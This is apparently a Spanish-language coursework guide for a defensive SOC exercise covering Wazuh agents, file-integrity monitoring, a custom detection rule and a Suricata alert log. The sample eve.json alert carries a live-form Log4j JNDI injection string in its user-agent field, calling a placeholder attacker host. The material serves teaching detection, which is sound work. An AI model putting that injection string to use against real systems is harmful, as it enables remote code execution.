# Guía Formativa - Misión 3: SOC & NIDS (Wazuh SIEM y Suricata eve.json)
**Asignatura:** Ciberseguridad Defensiva (OCY1105 / CSY6122 / CSY1102)  
**Entorno:** NetChile Corp / Soluciones Tecnológicas SPA  
**Rol:** SOC Analyst Tier 2 / SIEM Engineer  

---

## 1. Arquitectura del Centro de Operaciones de Seguridad (SOC)

El SOC defensivo de NetChile Corp integra una arquitectura centralizada basada en **Wazuh SIEM / XDR** combinada con **Suricata NIDS** como sensor de inspección profunda de paquetes (*Deep Packet Inspection*).

```
   +-------------------------------------------------------------------+
   |                       WAZUH SIEM CENTRAL                         |
   |          Wazuh Manager + Wazuh Indexer + Wazuh Dashboard          |
   +-------------------------------------------------------------------+
                                    ^
       +----------------------------+----------------------------+
       |                            |                            |
       v                            v                            v
+--------------+             +--------------+             +--------------+
| AGENTE 001   |             | AGENTE 002   |             | AGENTE 003   |
| Web Server   |             | DB Core      |             | Domain Ctrl  |
| Debian 12    |             | Ubuntu 22.04 |             | WinSrv 2022  |
| Suricata NIDS|             | FIM syscheck |             | Security Logs|
+--------------+             +--------------+             +--------------+
```

---

## 2. Configuración y Operación de Wazuh SIEM

### 2.1 Despliegue de Agentes y Verificación de Estado
En cada endpoint defensivo, el agente de Wazuh se comunica bidireccionalmente con el Manager:
```bash
# Verificar estado del agente en Linux
systemctl status wazuh-agent

# Listar agentes conectados en el Manager
/var/ossec/bin/agent_control -l
```

### 2.2 Monitoreo de Integridad de Archivos (FIM / syscheck)
Configuración en `/var/ossec/etc/ossec.conf` para alertar ante modificaciones no autorizadas en archivos críticos:
```xml
<syscheck>
  <frequency>300</frequency>
  <directories check_all="yes" realtime="yes">/etc/passwd,/etc/shadow,/etc/sudoers</directories>
  <directories check_all="yes" realtime="yes">C:\Windows\System32\drivers\etc\hosts</directories>
</syscheck>
```

### 2.3 Reglas Personalizadas de Detección (`local_rules.xml`)
Detección de comportamiento anómalo (ejemplo: generación de PowerShell desde servicios del sistema):
```xml
<group name="custom_attack_detection,">
  <rule id="100201" level="12">
    <if_sid>60103</if_sid>
    <field name="win.eventdata.parentProcessName">services.exe</field>
    <field name="win.eventdata.image">powershell.exe</field>
    <description>ALERTA CRÍTICA: Spawn anómalo de PowerShell ejecutado desde services.exe (Posible Persistencia/Servicio Malicioso).</description>
    <mitre>
      <id>T1543.003</id>
    </mitre>
  </rule>
</group>
```

---

## 3. Integración y Parseo de Suricata NIDS (`eve.json`)

### 3.1 Ubicación y Estructura de Telemetría NIDS
Suricata registra todos los eventos de alerta en formato JSON en `/var/log/suricata/eve.json`.

Ejemplo de registro de alerta crítica parseado:
```json
{
  "timestamp": "2026-08-30T02:40:15.892114+0000",
  "flow_id": 18294729104,
  "event_type": "alert",
  "src_ip": "198.51.100.77",
  "src_port": 53210,
  "dest_ip": "10.0.0.25",
  "dest_port": 8080,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2034647,
    "rev": 1,
    "signature": "ET EXPLOIT Possible Apache Log4j RCE Attempt (CVE-2021-44228)",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "http": {
    "hostname": "10.0.0.25",
    "url": "/login",
    "http_user_agent": "${jndi:ldap://198.51.100.77:1389/Exploit}"
  }
}
```

### 3.2 Correlación en SIEM y Respuesta Activa (*Active Response*)
1. Wazuh ingesta `/var/log/suricata/eve.json` a través de su decodificador `suricata`.
2. Al identificar una regla de severidad alta (`severity: 1`), Wazuh dispara el script de respuesta activa `/var/ossec/active-response/bin/firewall-drop.sh`.
3. Se aplica regla temporal de bloqueo en `iptables` / `nftables` aislando la IP agresora por 3600 segundos.

---

## 4. Entregables de la Misión 3
1. Diligenciamiento de la sección 3 en [`templates/plantilla_informe.txt`](file:///C:/Users/cloud/soc-autograder/templates/plantilla_informe.txt).
2. Evidencia de parseo de campos clave de `eve.json` (IPs, firmas, severidad, payload) y descripción de correlación con Wazuh.
